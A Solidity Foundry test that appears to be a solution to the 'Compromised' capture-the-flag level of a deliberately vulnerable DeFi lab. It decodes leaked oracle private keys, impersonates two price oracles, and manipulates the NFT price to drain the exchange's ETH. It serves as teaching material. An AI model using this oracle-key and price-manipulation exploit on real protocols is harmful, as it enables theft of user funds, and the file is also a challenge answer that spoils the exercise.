// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";

import {Exchange} from "../../../Contracts/compromised/Exchange.sol";
import {TrustfulOracle} from "../../../Contracts/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../../Contracts/compromised/TrustfulOracleInitializer.sol";
import {DamnValuableNFT} from "../../../Contracts/DamnValuableNFT.sol";

contract Compromised is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
    uint256 internal constant INITIAL_NFT_PRICE = 999e18;

    Exchange internal exchange;
    TrustfulOracle internal trustfulOracle;
    TrustfulOracleInitializer internal trustfulOracleInitializer;
    DamnValuableNFT internal damnValuableNFT;
    address payable internal attacker;

    function setUp() public {
        address[] memory sources = new address[](3);

        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.deal(attacker, 0.1 ether);
        vm.label(attacker, "Attacker");
        assertEq(attacker.balance, 0.1 ether);

        // Initialize balance of the trusted source addresses
        uint256 arrLen = sources.length;
        for (uint8 i = 0; i < arrLen; ) {
            vm.deal(sources[i], 2 ether);
            assertEq(sources[i].balance, 2 ether);
            unchecked {
                ++i;
            }
        }

        string[] memory symbols = new string[](3);
        for (uint8 i = 0; i < arrLen; ) {
            symbols[i] = "DVNFT";
            unchecked {
                ++i;
            }
        }

        uint256[] memory initialPrices = new uint256[](3);
        for (uint8 i = 0; i < arrLen; ) {
            initialPrices[i] = INITIAL_NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        // Deploy the oracle and setup the trusted sources with initial prices
        trustfulOracle = new TrustfulOracleInitializer(
            sources,
            symbols,
            initialPrices
        ).oracle();

        // Deploy the exchange and get the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
            address(trustfulOracle)
        );
        damnValuableNFT = exchange.token();

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        // This is a private key corresponding to first data given in challenge : 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
        // To get this private key, use CyberChef Magic function - https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=NGQgNDggNjggNmEgNGUgNmEgNjMgMzQgNWEgNTcgNTkgNzggNTkgNTcgNDUgMzAgNGUgNTQgNWEgNmIgNTkgNTQgNTkgMzEgNTkgN2EgNWEgNmQgNTkgN2EgNTUgMzQgNGUgNmEgNDYgNmIgNGUgNDQgNTEgMzQgNGYgNTQgNGEgNmEgNWEgNDcgNWEgNjggNTkgN2EgNDIgNmEgNGUgNmQgNGQgMzQgNTkgN2EgNDkgMzEgNGUgNmEgNDIgNjkgNWEgNmEgNDIgNmEgNGYgNTcgNWEgNjkgNTkgMzIgNTIgNjggNWEgNTQgNGEgNmQgNGUgNDQgNjMgN2EgNGUgNTcgNDUgMzU
        address pubKey1 = vm.addr(
            uint256(
                0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
            )
        );
        console.log(
            "Pub key for 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9 =",
            pubKey1
        );
        vm.label(pubKey1, "Oracle 1");
        // This is a private key corresponding to second data given in challenge : 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
        // To get this private key, use CyberChef Magic function - https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=NGQgNDggNjcgNzkgNGQgNDQgNjcgNzkgNGUgNDQgNGEgNmEgNGUgNDQgNDIgNjggNTkgMzIgNTIgNmQgNTkgNTQgNmMgNmMgNWEgNDQgNjcgMzQgNGYgNTcgNTUgMzIgNGYgNDQgNTYgNmEgNGQgNmEgNGQgMzEgNGUgNDQgNjQgNjggNTkgMzIgNGEgNmMgNWEgNDQgNmMgNjkgNWEgNTcgNWEgNmEgNGUgNmEgNDEgN2EgNGUgN2EgNDYgNmMgNGYgNTQgNjcgMzMgNGUgNTcgNWEgNjkgNTkgMzIgNTEgMzMgNGQgN2EgNTkgN2EgNGUgNDQgNDIgNjkgNTkgNmEgNTEgMzQ
        address pubKey2 = vm.addr(
            uint256(
                0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
            )
        );
        console.log(
            "Pub key for 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48 =",
            pubKey2
        );
        vm.label(pubKey2, "Oracle 2");

        console.log("Balance of exchange in wei =", address(exchange).balance);
        console.log("Balance of attacker in wei =", address(attacker).balance);
        console.log("\nMEDIAN AND PRICES : ");
        console.log("Median = ", trustfulOracle.getMedianPrice("DVNFT"));
        uint256[] memory prices = trustfulOracle.getAllPricesForSymbol("DVNFT");
        for (uint8 i; i < prices.length; i++)
            console.log("Prize", i, "=", prices[i]);

        console.log("Oracle 1 is setting DVNFT price to zero");
        vm.prank(pubKey1);
        trustfulOracle.postPrice("DVNFT", 0);

        console.log("Oracle 2 is setting DVNFT price to zero");
        vm.prank(pubKey2);
        trustfulOracle.postPrice("DVNFT", 0);

        console.log("\nMEDIAN AND PRICES : ");
        console.log("Median = ", trustfulOracle.getMedianPrice("DVNFT"));
        prices = trustfulOracle.getAllPricesForSymbol("DVNFT");
        for (uint8 i; i < prices.length; i++)
            console.log("Prize", i, "=", prices[i]);

        console.log("Attacker buying DVNFT at price zero");
        vm.prank(attacker);
        uint256 tokenID = exchange.buyOne{value: 100000000000000000}();
        console.log("Token ID minted :", tokenID);
        console.log("Balance of exchange in wei =", address(exchange).balance);
        console.log("Balance of attacker in wei =", address(attacker).balance);

        console.log("Oracle 1 is setting price of DVNFT to 9990");
        vm.prank(pubKey1);
        trustfulOracle.postPrice("DVNFT", 9990 ether);

        console.log("Oracle 2 is setting price of DVNFT to 9990");
        vm.prank(pubKey2);
        trustfulOracle.postPrice("DVNFT", 9990 ether);

        console.log("\nMEDIAN AND PRICES : ");
        console.log("Median = ", trustfulOracle.getMedianPrice("DVNFT"));
        prices = trustfulOracle.getAllPricesForSymbol("DVNFT");
        for (uint8 i; i < prices.length; i++)
            console.log("Prize", i, "=", prices[i]);

        console.log("Attacker selling an DVNFT");
        vm.startPrank(attacker);
        exchange.token().approve(address(exchange), tokenID);
        exchange.sellOne(tokenID);
        vm.stopPrank();

        console.log("\nMEDIAN AND PRICES : ");
        console.log("Median   = ", trustfulOracle.getMedianPrice("DVNFT"));
        prices = trustfulOracle.getAllPricesForSymbol("DVNFT");
        for (uint8 i; i < prices.length; i++)
            console.log("Prize", i, "=", prices[i]);

        console.log("\nSetting DVNFT price back to normal i.e. 999 ETH");
        console.log("Oracle 1 is setting price of DVNFT to 999");
        vm.prank(pubKey1);
        trustfulOracle.postPrice("DVNFT", 999 ether);

        console.log("Oracle 2 is setting price of DVNFT to 999");
        vm.prank(pubKey2);
        trustfulOracle.postPrice("DVNFT", 999 ether);

        console.log("\nMEDIAN AND PRICES : ");
        console.log("Median   = ", trustfulOracle.getMedianPrice("DVNFT"));
        prices = trustfulOracle.getAllPricesForSymbol("DVNFT");
        for (uint8 i; i < prices.length; i++)
            console.log("Prize", i, "=", prices[i]);

        console.log("Balance of exchange in wei =", address(exchange).balance);
        console.log("Balance of attacker in wei =", address(attacker).balance);

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Attacker's ETH balance must have significantly increased
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        assertEq(damnValuableNFT.balanceOf(attacker), 0);

        // NFT price shouldn't have changed
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
